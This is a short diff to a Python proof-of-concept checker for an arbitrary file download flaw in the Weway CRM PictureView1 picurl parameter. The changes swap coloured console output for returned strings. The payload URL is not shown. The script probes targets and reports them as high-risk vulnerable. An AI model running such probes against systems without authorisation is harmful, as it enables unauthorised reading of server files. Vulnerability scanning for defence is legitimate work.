@@ -8,8 +8,8 @@ description: 文件Common/PictureView1中,参数picurl存在任意文件下载�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class weway_PictureView1_filedownload_BaseVerify:
     def __init__(self, url):
@@ -24,12 +24,12 @@ class weway_PictureView1_filedownload_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
-                cprint("[+]存在任我行crm任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在任我行crm任意文件下载漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = weway_PictureView1_filedownload_BaseVerify(sys.argv[1])
     testVuln.run()
